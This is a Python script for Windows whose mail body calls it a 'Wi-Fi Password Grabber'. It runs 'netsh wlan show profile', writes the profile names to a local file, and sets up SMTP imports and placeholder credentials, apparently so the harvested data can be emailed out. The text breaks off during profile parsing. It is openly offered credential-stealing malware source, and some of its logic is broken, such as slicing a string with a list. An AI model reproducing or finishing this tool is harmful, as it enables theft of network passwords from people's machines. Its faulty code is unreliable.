import os
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import glob
import random
import shutil
import subprocess
import sys
import time
import urllib.request
import win32api
import win32con
import win32gui
import win32ui
import winreg
from win32api import GetSystemMetrics

sys_info = "Information.txt"

var = 2

YOUR_USERNAME = "YOUR_USERNAME"
YOUR_PASSWORD = "YOUR_PASSWORD"


file_path = os.getcwd()


def get_desktop():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
    return winreg.QueryValueEx(key, "Desktop")[0]


sender = "Private Person <from@example.com>"
receiver = "A Test User <to@example.com>"

message = f"""\
Subject: Hi Mailtrap
To: {receiver}
From: {sender}
Wi-Fi Password Grabber by Archisman Karmakar.\n"""


if os.name == "nt":
    # os.system("cls")
    output = subprocess.check_output("netsh wlan show profile", shell=True)
    # output = output.decode("utf-8")
    # output = output.split()
    # print(output)
    output = str(output)
    start = output.find("Profile :")
    end = output.split("\\r\\n")
    substring = output[start:end]
    words_list = output.split()
    jungkook = 2
    with open(file_path + "\\" + sys_info, "w") as f:
        f.write("All reg conns: \n")
        f.close()
    for wordblk in output.split():
        if wordblk == "Profile":
            next_word = words_list[words_list.index(wordblk) + jungkook]
            next_word = next_word.split("\\r\\n")[0]
            knj = jungkook+1
            try:
                while "All" not in next_word:
                    next_word += " " + words_list[words_list.index(wordblk) + knj]
                    knj += 1
            except:
                pass

